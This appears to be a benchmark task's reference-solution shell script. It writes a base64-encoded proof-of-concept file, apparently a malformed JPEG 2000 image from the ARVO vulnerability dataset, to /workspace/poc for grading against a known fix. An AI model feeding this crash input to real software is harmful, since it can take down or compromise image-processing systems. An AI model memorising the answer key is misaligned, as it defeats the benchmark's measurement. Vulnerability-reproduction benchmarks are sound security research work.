#!/bin/bash
# Reference solution: materialize the known-good PoC (the ARVO testcase the
# fix commit a5ac8195 addresses) at /workspace/poc — the 'oracle passes' side of
# the bidirectional validation. (Does NOT build; grading runs on the oracle's
# untouched images, so this is level-independent.)
set -euo pipefail

mkdir -p /workspace
base64 -d > /workspace/poc <<'B64'
/0//UQAvICAAACAgAAAAIAAAIAAAAAAAICAgICAgICAAACAAAAAAAAADDwEBDwEBDwEB/1IADv8AICAgASAg/wEg//9gAA0gICAgICAgICAgIP+QAAoAAAAAAAAAIP+T/yAgICAgICAgICA=
B64

echo "wrote $(wc -c < /workspace/poc) bytes to /workspace/poc"
